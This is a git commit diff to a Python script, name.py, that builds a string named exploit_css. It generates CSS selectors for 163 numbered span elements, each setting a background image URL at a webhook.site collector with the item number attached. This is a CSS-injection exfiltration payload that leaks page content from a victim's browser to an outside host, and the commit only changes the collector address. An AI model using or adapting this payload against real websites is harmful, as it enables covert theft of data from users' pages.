3d3f40b07faad30d13b8592bd5ad5cf026640b3b
shahirsu <62285063+shahirsu@users.noreply.github.com>
2023-02-05 14:34:03 +0100

    Update and rename name to name.py

--- name.py
+++ name.py
@@ -3,7 +3,7 @@ exploit_css = ""
 for i in range(1, 164):
     exploit_css += '''
     span[role="img"][aria-label="''' + str(i) + '''"]:empty {
-        background: url('https://webhook.site/7ecc884d-b05b-4433-97f7-574d1d78dc63/?item=''' + str(i) + '''');
+        background: url('https://webhook.site/e03541ad-7f69-46eb-a1b2-a7df765f335a/?item=''' + str(i) + '''');
     }
     '''
     
